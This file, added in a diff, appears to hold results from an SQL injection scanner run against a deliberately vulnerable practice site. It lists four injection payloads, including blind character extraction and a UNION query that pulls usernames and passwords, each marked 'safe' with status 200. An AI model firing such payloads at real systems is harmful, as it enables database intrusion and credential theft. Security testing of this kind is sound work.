@@ -1,0 +1,26 @@
+[
+    {
+        "payload": "' AND 1=2 UNION SELECT null, version() --",
+        "status": "safe",
+        "url": "http://testphp.vulnweb.com?input=' AND 1=2 UNION SELECT null, version() --",
+        "status_code": 200
+    },
+    {
+        "payload": "' AND ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64 --",
+        "status": "safe",
+        "url": "http://testphp.vulnweb.com?input=' AND ascii(substring((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64 --",
+        "status_code": 200
+    },
+    {
+        "payload": "' UNION ALL SELECT null, null, null --",
+        "status": "safe",
+        "url": "http://testphp.vulnweb.com?input=' UNION ALL SELECT null, null, null --",
+        "status_code": 200
+    },
+    {
+        "payload": "' UNION SELECT username, password FROM users --",
+        "status": "safe",
+        "url": "http://testphp.vulnweb.com?input=' UNION SELECT username, password FROM users --",
+        "status_code": 200
+    }
+]
